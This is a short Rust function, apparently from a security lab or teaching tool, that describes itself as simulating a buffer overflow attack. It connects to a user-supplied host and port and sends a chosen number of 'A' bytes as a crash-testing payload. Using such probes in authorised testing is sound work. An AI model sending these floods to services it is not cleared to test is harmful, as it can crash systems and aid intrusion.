use std::io::{self, Read, Write};
use std::net::TcpStream;

pub fn overflow_server() {
    println!("Simulating buffer overflow attack...");

    // Prompt for server address
    print!("Enter the server address (e.g., 127.0.0.1): ");
    io::stdout().flush().unwrap();
    let mut server_address = String::new();
    io::stdin().read_line(&mut server_address).unwrap();
    let server_address = server_address.trim();

    // Prompt for server port
    print!("Enter the server port (e.g., 9999): ");
    io::stdout().flush().unwrap();
    let mut port = String::new();
    io::stdin().read_line(&mut port).unwrap();
    let port = match port.trim().parse::<u16>() {
        Ok(p) if (1..=65535).contains(&p) => p,
        _ => {
            eprintln!("Invalid port. Please enter a valid number between 1 and 65535.");
            return;
        }
    };

    // Prompt for payload size
    print!("Enter the payload size (bytes) to send (e.g., 300): ");
    io::stdout().flush().unwrap();
    let mut payload_size = String::new();
    io::stdin().read_line(&mut payload_size).unwrap();
    let payload_size = match payload_size.trim().parse::<usize>() {
        Ok(size) if size > 0 => size,
        _ => {
            eprintln!("Invalid payload size. Please enter a positive number.");
            return;
        }
    };

    // Connect to the server
    let server = format!("{}:{}", server_address, port);
    match TcpStream::connect(&server) {
        Ok(mut stream) => {
            println!("[+] Connected to the server at {}", server);

            // Construct the payload
            let payload = "A".repeat(payload_size);

            // Send the payload
            println!("[+] Sending payload of {} bytes...", payload_size);
            if let Err(e) = stream.write_all(payload.as_bytes()) {
                eprintln!("[-] Failed to send payload: {}", e);
                return;
            }

            // Receive the server's response
            let mut buffer = [0; 1024];
            match stream.read(&mut buffer) {
                Ok(bytes_read) => {
                    println!("[+] Received response from the server:");
                    println!("{}", String::from_utf8_lossy(&buffer[..bytes_read]));
                }
                Err(e) => {
                    eprintln!("[-] Failed to read response: {}", e);
                }
            }
        }
        Err(e) => {
            eprintln!("[-] Failed to connect to the server: {}", e);
        }
    }
}
